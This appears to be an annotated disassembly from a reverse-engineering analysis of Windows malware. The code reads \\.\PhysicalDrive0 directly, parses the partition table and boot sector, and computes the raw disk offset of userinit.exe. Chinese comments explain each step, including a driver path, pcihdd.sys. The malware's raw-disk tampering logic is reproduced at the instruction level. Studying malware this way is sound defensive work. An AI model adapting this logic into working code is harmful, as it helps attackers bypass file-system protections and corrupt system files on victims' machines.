
```
0040148E     68 00020000              push 200                                  ; 缓冲区长度
00401493     8D85 D4FAFFFF          lea eax,dword ptr ss:[ebp-52C]            ; 读入\\.\PhysicalDrive0 的缓冲区地址
00401499     50                     push eax
0040149A     FFB5 D0FAFFFF          push dword ptr ss:[ebp-530]               ; \\.\PhysicalDrive0 句柄，读取 1 扇区
004014A0     E8 F3020000           call 00401798                              ; <jmp.&kernel32.ReadFile>
004014A5     8DBD D4FAFFFF          lea edi,dword ptr ss:[ebp-52C]
004014AB     80BF BE010000 80      cmp byte ptr ds:[edi+1BE],80              ; 分区是否为可引导分区（也就是常规的分区是否激活概念）
004014B2     0F85 DE010000         jnz 00401696                               ; 00401696
004014B8     0FB69F C2010000      movzx ebx,byte ptr ds:[edi+1C2]           ; 取分区系统类型
004014BF     83FB 0B              cmp ebx,0B                                 ; 文件系统是否为 FAT32
004014C2     74 0E               je short 004014D2                          ; 004014D2
004014C4     83FB 0C              cmp ebx,0C                                 ; 文件系统是否为 FAT32
004014C7     74 09               je short 004014D2                          ; 004014D2
004014C9     83FB 07              cmp ebx,7                                  ; 文件系统是否为 NTFS
004014CC     0F85 BB010000        jnz 0040168D                               ; 0040168D
004014D2     8B87 C6010000        mov eax,dword ptr ds:[edi+1C6]             ; C 盘起始扇区（首扇区的相对扇区号）
004014D8     8985 CCFAFFFF        mov dword ptr ss:[ebp-534],eax
004014DE     33D2                 xor edx,edx
004014E0     69C0 00020000        imul eax,eax,200                           ; 3f*200
004014E6     8955 E8              mov dword ptr ss:[ebp-18],edx
004014E9     8BC8                 mov ecx,eax
004014EB     6A 00                push 0
004014ED     8D45 E8              lea eax,dword ptr ss:[ebp-18]
004014F0     50                   push eax
004014F1     51                   push ecx                                     ; 转移定位到 7e00
004014F2     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]                ; \\.\PhysicalDrive0 句柄
004014F8     E8 AD020000         call 004017AA                              ; <jmp.&kernel32.SetFilePointer>
004014FD     6A 00                push 0
004014FF     8D45 E8              lea eax,dword ptr ss:[ebp-18]
00401502     50                   push eax
00401503     68 00020000          push 200
00401508     8D85 D4FAFFFF        lea eax,dword ptr ss:[ebp-52C]
0040150E     50                   push eax
0040150F     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]                ; 读取 C 盘的 1 扇区
00401515     E8 7E020000         call 00401798                              ; <jmp.&kernel32.ReadFile>
0040151A     8DBD D4FAFFFF        lea edi,dword ptr ss:[ebp-52C]
00401520     0FB747 0E            movzx eax,word ptr ds:[edi+E]
00401524     0185 CCFAFFFF        add dword ptr ss:[ebp-534],eax             ; 3f+24=63
0040152A     83FB 0B              cmp ebx,0B
0040152D     74 05               je short 00401534                          ; 00401534
0040152F     83FB 0C              cmp ebx,0C
00401532     75 12               jnz short 00401546                         ; 00401546
00401534     0FB64F 10            movzx ecx,byte ptr ds:[edi+10]
00401538     8B47 24              mov eax,dword ptr ds:[edi+24]
0040153B     33D2                 xor edx,edx
0040153D     0FAFC1               imul eax,ecx
00401540     0185 CCFAFFFF        add dword ptr ss:[ebp-534],eax             ; 63+48bc=491f
00401546     8B85 C4FAFFFF        mov eax,dword ptr ss:[ebp-53C]             ; 解码数 b6204
0040154C     8B95 C8FAFFFF        mov edx,dword ptr ss:[ebp-538]
00401552     0FB64F 0D            movzx ecx,byte ptr ds:[edi+D]
00401556     898D B4FAFFFF        mov dword ptr ss:[ebp-54C],ecx
0040155C     0FAFC1               imul eax,ecx                               ; b6204*10=b62040
0040155F     0385 CCFAFFFF        add eax,dword ptr ss:[ebp-534]
00401565     83D2 00              adc edx,0
00401568     69C0 00020000        imul eax,eax,200                           ; *200=6cd2be00
0040156E     8995 C0FAFFFF        mov dword ptr ss:[ebp-540],edx
00401574     8985 BCFAFFFF        mov dword ptr ss:[ebp-544],eax
0040157A     6A 00                push 0
0040157C     8D85 C0FAFFFF        lea eax,dword ptr ss:[ebp-540]
00401582     50                   push eax
00401583     FFB5 BCFAFFFF        push dword ptr ss:[ebp-544]
00401589     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]                ; userinit.exe 在盘的绝对偏移地址,也就是驱动先找到它的绝对地址，然后加密后报告给病毒
0040158F     E8 16020000         call 004017AA                              ; <jmp.&kernel32.SetFilePointer>
00401594     6A 00                push 0
00401596     8D45 E8              lea eax,dword ptr ss:[ebp-18]
00401599     50                   push eax
0040159A     68 00020000          push 200
0040159F     8D85 D4FAFFFF        lea eax,dword ptr ss:[ebp-52C]             ; 读 userinit.exe 的缓冲区
004015A5     50                   push eax
004015A6     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]
004015AC     E8 E7010000         call 00401798                              ; <jmp.&kernel32.ReadFile>

004015B1     8DBD D4FAFFFF        lea edi,dword ptr ss:[ebp-52C]
004015B7     8DB5 D4FCFFFF        lea esi,dword ptr ss:[ebp-32C]
004015BD     B9 00020000          mov ecx,200
004015C2     F3:A6              repe cmps byte ptr es:[edi],byte ptr ds:
004015C4     0BC9                 or ecx,ecx
004015C6     0F85 B8000000       jnz 00401684                                 ; dumped_.00401684
004015CC     6A 00                push 0
004015CE     8D85 C0FAFFFF        lea eax,dword ptr ss:[ebp-540]
004015D4     50                   push eax
004015D5     FFB5 BCFAFFFF        push dword ptr ss:[ebp-544]
004015DB     FFB5 D0FAFFFF        push dword ptr ss:[ebp-530]
004015E1     E8 C4010000         call 004017AA                              ; <jmp.&kernel32.SetFilePointer>
004015E6     8B85 B4FAFFFF        mov eax,dword ptr ss:[ebp-54C]
004015EC     C1E0 09              shl eax,9
004015EF     8985 B4FAFFFF        mov dword ptr ss:[ebp-54C],eax
004015F5     FFB5 B4FAFFFF        push dword ptr ss:[ebp-54C]
004015FB     6A 40                push 40
004015FD     E8 78010000         call 0040177A                              ; <jmp.&kernel32.GlobalAlloc>
00401602     0BC0                 or eax,eax
00401604     74 6A                je short 00401670                          ; dumped_.00401670
00401606     8985 B0FAFFFF        mov dword ptr ss:[ebp-550],eax
0040160C     B9 3E174000          mov ecx,40173E
00401611     81E9 00104000        sub ecx,401000                             ; ASCII "%SystemRoot%\system32\drivers\pcihdd.sys"
```
